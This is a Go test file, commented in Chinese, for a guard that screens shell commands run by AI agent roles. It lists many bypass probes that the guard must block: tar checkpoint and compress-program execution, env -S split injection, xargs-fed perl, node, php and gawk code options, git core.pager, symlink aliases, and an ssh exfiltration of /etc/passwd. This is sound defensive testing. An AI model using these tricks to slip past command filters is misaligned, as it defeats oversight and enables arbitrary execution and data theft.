		// R2-MF-2 功能回归恢复:粘连 -m 后动态/通配参数是模块参数而非模块名。
		{"P-R2-MF2-a python3 -mjson.tool", `python3 -mjson.tool "$HOME/a.json"`},
		{"P-R2-MF2-b python3 -mpytest glob", `python3 -mpytest tests/*.py`},
		// R2-MF-3 功能回归恢复:-e/-f 之后输入文件名是数据。
		{"P-R2-MF3-a find sed -e", `find . -name '*.txt' -exec sed -e 's/foo/bar/' {} \;`},
		{"P-R2-MF3-b xargs sed -e", `echo foo.txt | xargs -I{} sed -e 's/foo/bar/' {}`},
		{"P-R2-MF3-c find awk -f", `find . -name '*.log' -exec awk -f parse.awk {} \;`},
		{"P-R2-MF3-a2 find sed -n -e", `find . -name '*.txt' -exec sed -n -e '1,5p' {} \;`},
		{"P-R2-MF3-a3 find sed -f", `find . -name '*.txt' -exec sed -f rules.sed {} \;`},
		// R2-MF-7 功能回归恢复:rg 参数位的 env -S 不触发包装链扫描。
		{"P-R2-MF7-b rg env -S operand", `find . -name '*.go' -exec rg env -S {} \;`},
		{"P-R2-MF7-b2 echo env -S operand", `echo foo | xargs -I{} echo env -S {}`},
		// R2-SF-2 假阳性恢复:-ctime 等时间谓词的值是数据。
		{"P-R2-SF2-b find -ctime value", `echo 5 | xargs -I{} find . -ctime {}`},
		// flock 正例:-xw 粘连簇与分离 -x -w 都正确解析到命令头 true。
		{"flock -xw 0 positive", `flock -xw 0 /dev/null true`},
		{"flock -x -w 30 positive", `flock -x -w 30 /dev/null true`},
		// script/typescript 合法调用不受选项区扫描误伤。
		{"script benign -c no token", `script -c 'echo hi' /tmp/out`},
		// R12 数据位保持:sh -c positional $1 与 git -C 路径值。
		{"R12 sh positional", `find . -exec sh -c 'echo "$1"' _ {} +`},
		{"R12 git -C data", `echo /tmp/repo | xargs -I{} git -C {} status`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}

	// P-R2-MF5-b/c: xargs -a 文件喂词与 argv+stdin 两路闭合。文件用
	// t.TempDir() 预建——`printf ... > /tmp/p` 前置重定向会独立命中写拦截
	// 掩盖目标路径 (Reviewer should-fix),且断言精确 verdict 子串。
	t.Run("P-R2-MF5-b xargs -a file feed", func(t *testing.T) {
		payload := filepath.Join(t.TempDir(), "payload")
		if err := os.WriteFile(payload, []byte("-c\npig\n"), 0644); err != nil {
			t.Fatalf("write payload: %v", err)
		}
		got := rtGuardCwd(t, rtCase{id: "P-R2-MF5-b", role: "worker", cmd: `xargs -a ` + payload + ` ssh dmit sh`}, "")
		if !strings.Contains(got, "ssh") {
			t.Fatalf("xargs -a payload ssh dmit sh = %q, want an ssh verdict block", got)
		}
	})
	t.Run("P-R2-MF5-c argv+stdin feed", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{
			id: "P-R2-MF5-c", role: "worker",
			argv:  []string{"xargs", "ssh", "dmit", "sh"},
			stdin: "-c pig",
		}, "")
		if !strings.Contains(got, "ssh") {
			t.Fatalf("argv xargs ssh dmit sh + stdin '-c pig' = %q, want an ssh verdict block", got)
		}
	})
	// R12 精确 verdict 不破坏:pipe 与 file-redir 两种传输必须各归其名。
	t.Run("R12 piped verdict exact", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R12-a", role: "worker", cmd: `echo code | xargs ssh dmit sh`}, "")
		if !strings.Contains(got, "piped stdin to ssh") {
			t.Fatalf("echo code | xargs ssh dmit sh = %q, want piped stdin to ssh", got)
		}
	})
	t.Run("R12 file-redir verdict exact", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R12-b", role: "worker", cmd: `xargs -a /tmp/items ssh dmit sh < /tmp/script.sh`}, "")
		if !strings.Contains(got, "file stdin to ssh stdin-program") {
			t.Fatalf("xargs -a file ssh dmit sh < redir = %q, want file stdin to ssh stdin-program", got)
		}
	})
}

// TestGuard_V622_OracleR2EnvCwd 覆盖 R2-MF-7 软链别名 env -S 注入
// (依赖文件系统软链布置,单独成组)。
func TestGuard_V622_OracleR2EnvCwd(t *testing.T) {
	cwd := t.TempDir()
	if err := os.Symlink("/usr/bin/env", filepath.Join(cwd, "myenv")); err != nil {
		t.Fatalf("symlink myenv -> /usr/bin/env: %v", err)
	}
	t.Run("P-R2-MF7-a symlink alias env -S", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{
			id: "P-R2-MF7-a", role: "worker",
			cmd: `echo "-e system('pig')" | xargs -I{} ./myenv -S "perl -e '1' {}"`,
		}, cwd)
		if got == "ALLOW" {
			t.Fatalf("./myenv -S split injection = ALLOW, want a guard block")
		}
	})
	// P-MF2-e 补齐 (R2-Obs-1):-uW 后 heredoc 代码流同样拦截。
	t.Run("P-MF2-e python3 -uW heredoc", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{
			id: "P-MF2-e", role: "worker",
			cmd: "python3 -uW ignore <<'EOF'\nimport os; os.system(\"pig\")\nEOF",
		}, "")
		if got == "ALLOW" {
			t.Fatalf("python3 -uW ignore heredoc = ALLOW, want a guard block")
		}
	})
	// R2-Obs-1: 独立两字符 -c 后查询标志不得放行脚本文件运行。
	t.Run("P-R2-Obs1 readonly bare -c then --version", func(t *testing.T) {
		if got := screenReadonlyWrite([]string{"python3", "-c", "-1; open('/var/a','w').write('x')", "--version"}); got == "" {
			t.Fatalf("screenReadonlyWrite python3 -c <code> --version = empty, want python3 block")
		}
	})
}

// TestGuard_V622_OracleR1EnvCwd 覆盖 MF-4a 结构别名与 MF-6 env -C 重锚
// 递归 caller 修复(依赖文件系统软链布置,单独成组)。
func TestGuard_V622_OracleR1EnvCwd(t *testing.T) {
	fakeHome := withTestTrustedHome(t)
	binDir := filepath.Join(fakeHome, ".local", "bin")
	if err := os.MkdirAll(binDir, 0755); err != nil {
		t.Fatalf("mkdir binDir: %v", err)
	}
	writeTestExecutable(t, filepath.Join(binDir, "npm-cli.js"), 0755)
	if err := os.Symlink(filepath.Join(binDir, "npm-cli.js"), filepath.Join(binDir, "bun")); err != nil {
		t.Fatalf("symlink bun -> npm-cli.js: %v", err)
	}
	t.Setenv("PATH", binDir+":"+os.Getenv("PATH"))
	t.Run("P-MF4a bun->npm-cli.js conflict", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "P-MF4a", role: "worker", cmd: `bun exec -- pig`}, "")
		if !strings.Contains(got, "conflicting structural alias") {
			t.Fatalf("bun exec -- pig = %q, want conflicting structural alias", got)
		}
	})

	cwd := filepath.Join(fakeHome, "proj")
	sub := filepath.Join(cwd, "sub")
	if err := os.MkdirAll(sub, 0755); err != nil {
		t.Fatalf("mkdir sub: %v", err)
	}
	if err := os.Symlink("/bin/sh", filepath.Join(sub, "mysh")); err != nil {
		t.Fatalf("symlink mysh -> /bin/sh: %v", err)
	}
	mf6 := []struct {
		name, cmd string
	}{
		{"P-MF6-a env -C watch -x", `echo pig | xargs -I{} env -C sub watch -x ./mysh -c '{}'`},
		{"P-MF6-b env -C watch open", `echo pig | xargs env -C sub watch -x ./mysh -c`},
		{"P-MF6-c env -C flock", `echo pig | xargs -I{} env -C sub flock /dev/null ./mysh -c '{}'`},
		{"P-MF6-d env -C find -exec", `echo pig | xargs -I{} env -C sub find . -exec ./mysh -c '{}' ';'`},
		{"P-MF6-e env -C flock open", `echo pig | xargs env -C sub flock /dev/null ./mysh -c`},
	}
	for _, tc := range mf6 {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, cwd)
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// v6.2.2 Oracle R3 (R4 闭环): R3-MF-1..6 / R3-SF-1..2 / R3-Obs-1 探针回归 —
// tar 长数据选项与 BSD 首词、wrapperChainEnvSplitHasToken 单步剥离、flock
// 真实长选项表 fail-closed、script 置换扫描与 -E/--echo、多代码槽短簇操作数
// 消费与合法数据文件名恢复、git/awk/xargs -a ssh 三路残余绕过、node spec
// 单源收口。BLOCK 探针均断言目标 verdict 子串(不被上游管道/重定向规则掩盖),
// ALLOW 探针钉住 Reviewer R2-6 的合法数据语义。
// ---------------------------------------------------------------------------

func TestGuard_V622_OracleR3Probes(t *testing.T) {
	// xargs -a / heredoc 用例的预建 payload(t.TempDir 避免前导重定向命中写
	// 拦截掩盖目标 verdict —— R3-Obs-2 测试隔离纪律)。
	payloadC := filepath.Join(t.TempDir(), "payload-c")
	if err := os.WriteFile(payloadC, []byte("-c\n"), 0644); err != nil {
		t.Fatalf("write payload-c: %v", err)
	}
	payloadCPig := filepath.Join(t.TempDir(), "payload-cpig")
	if err := os.WriteFile(payloadCPig, []byte("-c\npig\n"), 0644); err != nil {
		t.Fatalf("write payload-cpig: %v", err)
	}
	// R3/R5 探针的 xargs -a 无管道 payload(Oracle R4 精确 verdict 纪律:
	// 管道 echo 会被上游 piped code 规则掩盖目标 verdict,改用 -a 文件喂入)。
	mkPayload := func(name, content string) string {
		p := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
		return p
	}
	payloadFooExec := mkPayload("payload-fooexec", "foo -exec pig ;\n")
	payloadCkpt := mkPayload("payload-ckpt", "a --checkpoint=1 --checkpoint-action=exec=pig\n")
	payloadDashE := mkPayload("payload-dashe", "-e\n")
	payloadBegin := mkPayload("payload-begin", "BEGIN{system(\"pig\")}\n")
	payloadCorePager := mkPayload("payload-cp", "core.pager\n")
	payloadPig := mkPayload("payload-pig", "pig\n")

	blockCases := []struct {
		name, cmd, want string
	}{
		// R3-MF-1: tar 长数据选项消费操作数 + BSD 首词严格限定 argv[0]。
		{"P-R3-MF1-a tar --file swallow", `tar -c --file foo.tar --use-compress-program=pig /dev/null`, "pig"},
		{"P-R3-MF1-b tar --directory ckpt", `tar --directory /tmp/f --checkpoint=1 --checkpoint-action=exec=pig -cf /dev/null /dev/null`, "pig"},
		{"P-R3-MF1-c tar fstab nonfirst", `tar -cf /dev/null /etc/fstab --use-compress-program=pig`, "pig"},
		{"P-R3-MF1-d tar BSD cIf", `tar cIf pig /dev/null /dev/null`, "pig"},
		// R3-MF-2: 单步剥离包装链,nice/timeout/嵌套 env 不再跃过 env -S。
		{"P-R3-MF2-a nice env -S find", `xargs -a ` + payloadFooExec + ` -I{} nice env -S "find . -name {}"`, "dynamic code payload"},
		{"P-R3-MF2-b timeout env -S", `xargs -a ` + payloadFooExec + ` -I{} timeout 10 env -S "find . -name {}"`, "dynamic code payload"},
		{"P-R3-MF2-c env -- env -S", `xargs -a ` + payloadFooExec + ` -I{} env -- env -S "find . -name {}"`, "dynamic code payload"},
		{"P-R3-MF2-d env -i env -S", `xargs -a ` + payloadFooExec + ` -I{} env -i env -S "find . -name {}"`, "dynamic code payload"},
		{"P-R3-MF2-e nice env -S tar", `xargs -a ` + payloadCkpt + ` -I{} nice env -S "tar -cf /dev/null {}"`, "dynamic code payload"},
		// R3-MF-3: flock 真实长选项表 + 未知长选项 fail-closed。
		{"P-R3-MF3-a flock --no-fork", `flock --no-fork /dev/null pig`, "pig"},
		{"P-R3-MF3-c flock --f fcntl", `flock --f /dev/null pig`, "pig"},
		{"P-R3-MF3-d flock --nb", `flock --nb /dev/null pig`, "pig"},
		// R3-MF-5: 多代码槽短簇操作数消费后继续扫选项区。
		{"P-R3-MF5-a perl -we -I", `X='/tmp -e system("pig")'; perl -we '1' -I $X`, "dynamic code payload"},
		{"P-R3-MF5-b ruby -we -I", `X='/tmp -e system("pig")'; ruby -we '1' -I $X`, "dynamic code payload"},
		{"P-R3-MF5-c php -nr -c", `X='a.ini -r system("pig");'; php -nr '1;' -c $X`, "dynamic code payload"},
		{"P-R3-MF5-d node -pe -r", `X='a.js -e require("child_process").execSync("pig")'; node -pe '1' -r $X`, "dynamic code payload"},
		{"P-R3-MF5-e bun -pe -c", `X='a.toml -e require("child_process").execSync("pig")'; bun -pe '1' -c $X`, "dynamic code payload"},
		// R3-MF-5 攻击面补充: 代码槽后选项位占位符仍拦截。
		{"P-R3-MF5-f perl -e xargs %", `xargs -a ` + payloadDashE + ` -I% perl -e '1' % 'system("pig")'`, "dynamic code payload"},
		{"P-R3-MF5-g perl -e dash-%", `xargs -a ` + payloadDashE + ` -I% perl -e '1' -%`, "dynamic code payload"},
		// v6.2.2 R5 加固: 自定义/默认替换 token 位于非末尾位置时,其后方参数
		// 仍可被扩展武装成 -e/-r 代码操作数,不再依赖硬编码拼写名单。
		{"P-R5-a xargs -I{} perl trailing", `xargs -a ` + payloadDashE + ` -I{} perl -e '1' {} 'system("pig")'`, "dynamic code payload"},
		{"P-R5-b xargs -IFOO custom token", `xargs -a ` + payloadDashE + ` -IFOO perl -e '1' FOO 'system("pig")'`, "dynamic code payload"},
		// R3-MF-6: git/awk/xargs 三路残余绕过。
		{"P-R3-MF6-a git -c key-side", `xargs -a ` + payloadCorePager + ` -I{} git -c '{}=pig' log`, "dynamic code payload"},
		{"P-R3-MF6-a2 git --config-env", `xargs -a ` + payloadPig + ` -I{} git --config-env 'core.pager={}' log`, "dynamic code payload"},
		{"P-R3-MF6-b gawk -f masks -e", `xargs -a ` + payloadBegin + ` -I{} gawk -f /dev/null /dev/null -e '{}'`, "dynamic code payload"},
		{"P-R3-MF6-c gawk -W source", `xargs -a ` + payloadBegin + ` -I{} gawk -e '1' -W 'source={}' /dev/null`, "dynamic code payload"},
		// R3-SF-1: node spec 单源收口(-C / 长值选项)。
		{"P-R3-SF1-a node --title", `node --title x -e 'require("child_process").execSync("pig")'`, "javascript inline code"},
		{"P-R3-SF1-b node --env-file", `node --env-file /dev/null -e 'require("child_process").execSync("pig")'`, "javascript inline code"},
		{"P-R3-SF1-c node -C", `node -C default -e 'require("child_process").execSync("pig")'`, "javascript inline code"},
		{"P-R3-SF1-d node -C stdin", `echo 'require("child_process").execSync("pig")' | node -C default -`, "piped code to javascript"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// R3-MF-4: script 置换扫描(xargs -a 无管道入口,断言 dynamic code payload
	// 精确 verdict —— 修复前仅靠 echo 管道误触 piped code to shell 掩盖)。
	for _, tc := range []struct{ name, cmd string }{
		{"P-R3-MF4-a script xargs -a pre", `xargs -a ` + payloadC + ` -I% script % 'pig' /dev/null`},
		{"P-R3-MF4-b script xargs -a post", `xargs -a ` + payloadC + ` -I% script /dev/null % 'pig'`},
		{"P-R3-MF4-d find -exec script", `find . -name '-c' -exec script {} 'pig' /dev/null \;`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if !strings.Contains(got, "dynamic code payload") {
				t.Fatalf("rtGuardCwd(%q) = %q, want dynamic code payload", tc.cmd, got)
			}
		})
	}
	t.Run("P-R3-MF4-c script argv+stdin", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{
			id: "P-R3-MF4-c", role: "worker",
			argv:  []string{"xargs", "-I%", "script", "%", "pig", "/dev/null"},
			stdin: "-c",
		}, "")
		if !strings.Contains(got, "dynamic code payload") {
			t.Fatalf("argv script %% pig + stdin '-c' = %q, want dynamic code payload", got)
		}
	})

	// R3-MF-3-b: flock --no-fork 后 python3 不再被错当锁文件。
	t.Run("P-R3-MF3-b flock --no-fork python3", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "P-R3-MF3-b", role: "worker", cmd: `flock --no-fork /dev/null python3 -c 'import os; os.system("pig")'`}, "")
		if !strings.Contains(got, "python inline code") {
			t.Fatalf("flock --no-fork python3 -c = %q, want python inline code", got)
		}
	})

	// R3-MF-6-d/e: xargs -a 配良性 here-string/heredoc 不再绕过 ssh stdin
	// 追加审查;f: GNU --arg-f 缩写接入 xargsMatchValueLong(verifier 外泄)。
	t.Run("P-R3-MF6-d xargs -a argv+stdin", func(t *testing.T) {
		// <<< here-string 是 bash-only 语法(/bin/sh dash 拒收),stdin 流通道
		// 经 argv+stdin 入口钉精确 verdict;heredoc 的 POSIX 拼写见 MF6-e。
		got := rtGuardCwd(t, rtCase{
			id: "P-R3-MF6-d", role: "worker",
			argv:  []string{"xargs", "-a", payloadCPig, "ssh", "dmit", "sh"},
			stdin: "echo hi",
		}, "")
		if !strings.Contains(got, "piped stdin to ssh") {
			t.Fatalf("xargs -a payload ssh dmit sh + stdin = %q, want piped stdin to ssh", got)
		}
	})
	t.Run("P-R3-MF6-e xargs -a heredoc", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "P-R3-MF6-e", role: "worker", cmd: "xargs -a " + payloadCPig + " ssh dmit sh <<'EOF'\necho hi\nEOF"}, "")
		if !strings.Contains(got, "piped stdin to ssh") {
			t.Fatalf("xargs -a payload ssh dmit sh heredoc = %q, want piped stdin to ssh", got)
		}
	})
	t.Run("P-R3-MF6-f xargs --arg-f verifier", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "P-R3-MF6-f", role: "verifier", cmd: `xargs --arg-f=/tmp/items -I{} ssh dmit cat < /etc/passwd`}, "")
		if !strings.Contains(got, "ssh remote write") {
			t.Fatalf("xargs --arg-f ssh cat exfil = %q, want ssh remote write", got)
		}
	})

	// Reviewer R2-6 合法数据 ALLOW 行: 解释器输入文件名 / awk -v 纯数据赋
	// 值 / git 纯数据路径值(glued 与分离双形态)。
	allowCases := []struct {
		name, cmd string
	}{
		{"R2-6-a find perl -pe data", `find . -exec perl -pe 's/a/b/' {} \;`},
		{"R2-6-b find awk -v data", `find . -exec awk -v f={} 'END {print f}' {} \;`},
		{"R2-6-c find awk -f -v data", `find . -exec awk -f parse.awk -v fname={} {} \;`},
		{"R2-6-d find git --git-dir glued", `find . -name .git -exec git --git-dir={} log -1 \;`},
		{"R2-6-e xargs awk -v", `echo x | xargs -I{} awk -v k={} 'BEGIN{print k}' /dev/null`},
		{"R2-6-f git --git-dir separate", `echo /tmp/repo | xargs -I{} git --git-dir {} log -1`},
		{"R2-6-g perl -we legit -I", `perl -we 'print qq(ok)' -I /tmp`},
		{"R5-a xargs -I{} perl -pe data", `echo a.txt | xargs -I{} perl -pe 's/a/b/' -- {}`},
		{"R5-b xargs -I{} perl -pe dot-slash", `echo a.txt | xargs -I{} perl -pe 's/a/b/' ./{}`},
		{"R5-c find perl -pe trailing", `find . -exec perl -pe 's/a/b/' {} other.txt \;`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}

	// R12 精确 verdict 不受 xargsDerivedSeg 收紧影响: 真管道与文件重定向
	// 各归其名。
	t.Run("R12 piped verdict unchanged", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R12-a-r3", role: "worker", cmd: `echo code | xargs ssh dmit sh`}, "")
		if !strings.Contains(got, "piped stdin to ssh") {
			t.Fatalf("echo code | xargs ssh dmit sh = %q, want piped stdin to ssh", got)
		}
	})
	t.Run("R12 file-redir verdict unchanged", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R12-b-r3", role: "worker", cmd: `xargs -a /tmp/items ssh dmit sh < /tmp/script.sh`}, "")
		if !strings.Contains(got, "file stdin to ssh stdin-program") {
			t.Fatalf("xargs -a file ssh dmit sh < redir = %q, want file stdin to ssh stdin-program", got)
		}
	})

	// 目标层直断断言(R3-Obs-2 防掩盖纪律): wrapperChainEnvSplitHasToken /
	// scriptOptZoneHasToken / gitExecConfigValueHasToken / flockMatchLong 的
	// 单元 verdict 不依赖上层管道或外围规则兜出 BLOCK。
	t.Run("R3-unit env-split chain direct", func(t *testing.T) {
		for _, tc := range []struct {
			name string
			argv []string
			want bool
		}{
			{"nice env -S find", []string{"nice", "env", "-S", "find . -name {}"}, true},
			{"timeout env -S find", []string{"timeout", "10", "env", "-S", "find . -name {}"}, true},
			{"env -- env -S find", []string{"env", "--", "env", "-S", "find . -name {}"}, true},
			{"env -i env -S find", []string{"env", "-i", "env", "-S", "find . -name {}"}, true},
			{"nice env -S tar", []string{"nice", "env", "-S", "tar -cf /dev/null {}"}, true},
			{"rg env -S operand", []string{"rg", "env", "-S", "{}"}, false},
			{"echo env -S operand", []string{"echo", "env", "-S", "{}"}, false},
		} {
			if got := wrapperChainEnvSplitHasToken(tc.argv, os.Getenv("PATH"), callerIdentity{}, "{}"); got != tc.want {
				t.Errorf("wrapperChainEnvSplitHasToken(%v) = %v, want %v", tc.argv, got, tc.want)
			}
		}
	})
	t.Run("R3-unit script zone direct", func(t *testing.T) {
		for _, tc := range []struct {
			name string
			h    []string
			want bool
		}{
			{"script % pig", []string{"script", "%", "pig", "/dev/null"}, true},
			{"script positional then %", []string{"script", "/dev/null", "%", "pig"}, true},
			{"script -q % pig", []string{"script", "-q", "%", "pig", "/dev/null"}, true},
			{"script -c benign", []string{"script", "-c", "echo hi", "/tmp/out"}, false},
			{"script -- terminator", []string{"script", "--", "%"}, false},
		} {
			if got := scriptOptZoneHasToken(tc.h, "%"); got != tc.want {
				t.Errorf("scriptOptZoneHasToken(%v) = %v, want %v", tc.h, got, tc.want)
			}
		}
	})
	t.Run("R3-unit git -c key-side direct", func(t *testing.T) {
		if !gitExecConfigValueHasToken("{}=pig", "{}") {
			t.Errorf("gitExecConfigValueHasToken({}=pig) = false, want true")
		}
		if !gitExecConfigValueHasToken("core.pager={}", "{}") {
			t.Errorf("gitExecConfigValueHasToken(core.pager={}) = false, want true")
		}
		if gitExecConfigValueHasToken("user.name={}", "{}") {
			t.Errorf("gitExecConfigValueHasToken(user.name={}) = true, want false for a non-exec key")
		}
	})
	t.Run("R3-unit flock long table direct", func(t *testing.T) {
		for _, tc := range []struct {
			in, want string
			ok       bool
		}{
			{"no-fork", "no-fork", true},
			{"nb", "nb", true},
			{"f", "fcntl", true},
			{"fd", "", false},
			{"nofork", "", false},
			{"com", "command", true},
			{"c", "", false},
		} {
			if full, ok := flockMatchLong(tc.in); full != tc.want || ok != tc.ok {
				t.Errorf("flockMatchLong(%q) = %q,%v want %q,%v", tc.in, full, ok, tc.want, tc.ok)
			}
		}
		if got := skipFlockLong([]string{"flock", "--no-fork-x", "/dev/null", "pig"}, 1); got != -1 {
			t.Errorf("skipFlockLong unknown long = %d, want -1 fail-closed", got)
		}
	})
}

// ---------------------------------------------------------------------------
// v6.2.2 Oracle R4 (R6 闭环): R4-MF-1..4 / R4-SF-1..4 / R4-Obs-1 探针回归 —
// tar 布尔 -h 不再吞并后续 exec 选项;xargs 替换 token 的单词粘连/=` 代码
// 选项 RCE(-esystem pig / --eval=...)在末词也不豁免;env -S 嵌套重拆链
// 不再被 len(rest)>=len(cur) 截断;gawk -W 按 GNU getopt_long "W;" 解析
// 且 -E/--exec 接通 stdin/动态校验,awk 位置参数不再终止选项区扫描。
// 管道 echo 形态受上游 piped code 规则掩盖(verdict 为 piped code to shell/
// perl/javascript),精确 dynamic code payload 断言一律走 xargs -a 无管道
// 入口(R3-Obs-2 隔离纪律);stdin 程序源断言走 echo 管道与 argv+stdin 双通道。
// ---------------------------------------------------------------------------

func TestGuard_V622_OracleR4Probes(t *testing.T) {
	mkPayload := func(name, content string) string {
		p := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
		return p
	}
	payloadEsys := mkPayload("r4-esys", "-esystem(\"pig\")\n")
	payloadEval := mkPayload("r4-eval", "--eval=require(\"child_process\").execSync(\"pig\")\n")
	payloadDash := mkPayload("r4-dash", "-\n")
	payloadFooExec := mkPayload("r4-fooexec", "foo -exec pig ;\n")
	payloadCkpt := mkPayload("r4-ckpt", "a --checkpoint=1 --checkpoint-action=exec=pig\n")
	payloadBegin := mkPayload("r4-begin", "BEGIN{system(\"pig\")}\n")
	payloadEvilAwk := mkPayload("r4-evilawk", "/tmp/evil.awk\n")

	blockCases := []struct {
		name, cmd, want string
	}{
		// R4-MF-1: tar 布尔 -h(--dereference)不再当带值字母吞并后续 exec 选项。
		{"P-R4-MF1-a tar -h use-compress", `tar -h --use-compress-program=pig -cf /dev/null /dev/null`, "pig"},
		{"P-R4-MF1-b tar -ch use-compress", `tar -ch --use-compress-program=pig -cf /dev/null /dev/null`, "pig"},
		{"P-R4-MF1-c tar -xh to-command", `tar -xh --to-command=pig -f /dev/null`, "pig"},
		{"P-R4-MF1-d tar -chI pig", `tar -chI pig -cf /dev/null /dev/null`, "pig"},
		{"P-R4-MF1-e tar -h ckpt-exec", `tar -h --checkpoint-action=exec=pig --checkpoint=1 -cf /dev/null /dev/null`, "pig"},
		// R4-MF-2: 单词粘连/=` 代码选项 RCE —— 末词也不豁免(xargs -a 无管道
		// 入口断言 dynamic code payload;stdin 管道形态的上游 verdict 另行验证)。
		{"P-R4-MF2-a perl glued -e", `xargs -a ` + payloadEsys + ` -I{} perl -e '1' {}`, "dynamic code payload"},
		{"P-R4-MF2-b perl -pe glued", `xargs -a ` + payloadEsys + ` -I{} perl -pe 's/a/b/' {}`, "dynamic code payload"},
		{"P-R4-MF2-c custom token FOO", `xargs -a ` + payloadEsys + ` -IFOO perl -e '1' FOO`, "dynamic code payload"},
		{"P-R4-MF2-d ruby glued -e", `xargs -a ` + payloadEsys + ` -I{} ruby -e '1' {}`, "dynamic code payload"},
		{"P-R4-MF2-e node --eval=", `xargs -a ` + payloadEval + ` -I{} node -e '1' {}`, "dynamic code payload"},
		{"P-R4-MF2-f bun --eval=", `xargs -a ` + payloadEval + ` -I{} bun -e '1' {}`, "dynamic code payload"},
		{"P-R4-MF2-g php glued -r", `xargs -a ` + mkPayload("r4-phpr", "-rsystem(\"pig\");\n") + ` -I{} php -r '1;' {}`, "dynamic code payload"},
		{"P-R4-MF2-h tsx --eval=", `xargs -a ` + payloadEval + ` -I{} tsx -e '1' {}`, "dynamic code payload"},
		// R4-MF-3: env -S 拆词重拼嵌套链不再被 len(rest)>=len(cur) 截断。
		{"P-R4-MF3-a env -Senv -S find", `xargs -a ` + payloadFooExec + ` -I{} env "-Senv -S" "find . -name {}"`, "dynamic code payload"},
		{"P-R4-MF3-b env -S nice chain", `xargs -a ` + payloadFooExec + ` -I{} env -S "nice nice nice" env -S "find . -name {}"`, "dynamic code payload"},
		{"P-R4-MF3-c env -S nested env", `xargs -a ` + payloadFooExec + ` -I{} env -S "nice nice env -S" "find . -name {}"`, "dynamic code payload"},
		{"P-R4-MF3-d env -Senv -S tar", `xargs -a ` + payloadCkpt + ` -I{} env "-Senv -S" "tar -cf /dev/null {}"`, "dynamic code payload"},
		// R4-MF-4: gawk -W GNU "W;" 语义 / -E/--exec / 位置参数后置选项。
		{"P-R4-MF4-c -W source PROG", `gawk -e '1' -W source 'BEGIN{system("pig")}' /dev/null`, "pig"},
		{"P-R4-MF4-d -W source xargs", `xargs -a ` + payloadBegin + ` -I{} gawk -e '1' -W source '{}' /dev/null`, "dynamic code payload"},
		{"P-R4-MF4-e -W so= prefix", `gawk -e '1' -W 'so=BEGIN{system("pig")}' /dev/null`, "pig"},
		{"P-R4-MF4-f -W exec xargs", `xargs -a ` + payloadBegin + ` -I{} gawk -e '1' -W exec '{}' /dev/null`, "dynamic code payload"},
		{"P-R4-MF4-g positional -f", `xargs -a ` + payloadDash + ` -I{} gawk -e '1' /dev/null -f '{}'`, "dynamic code payload"},
		{"P-R4-MF4-x1 --file= positional", `xargs -a ` + payloadEvilAwk + ` -I{} gawk -e '1' /dev/null --file='{}'`, "dynamic code payload"},
		{"P-R4-MF4-x2 -f mask -f", `xargs -a ` + payloadEvilAwk + ` -I{} gawk -f /dev/null /dev/null -f '{}'`, "dynamic code payload"},
		{"P-R4-MF4-x3 positional -i", `xargs -a ` + payloadEvilAwk + ` -I{} gawk -e '1' /dev/null -i '{}'`, "dynamic code payload"},
		{"P-R4-MF4-x4 -W file= token", `xargs -a ` + payloadEvilAwk + ` -I{} gawk -e '1' /dev/null -W 'file={}'`, "dynamic code payload"},
		// R4-SF-1: flagCodes 后接非代码字母不再丢失 hasFlagCode。
		{"P-R4-SF1 node -pi pending", `xargs -a ` + payloadDash + ` -I% node -pi '1' %`, "dynamic code payload"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// R4-MF-2 管道路径:stdin 是任意字节的 xargs 馈入,整块管线必 BLOCK
	// (上游 piped code verdict 与精确 exec-slot verdict 任一都算闭合)。
	for _, tc := range []struct{ name, cmd string }{
		{"P-R4-MF2-a-pipe perl glued", `echo '-esystem("pig")' | xargs -I{} perl -e '1' {}`},
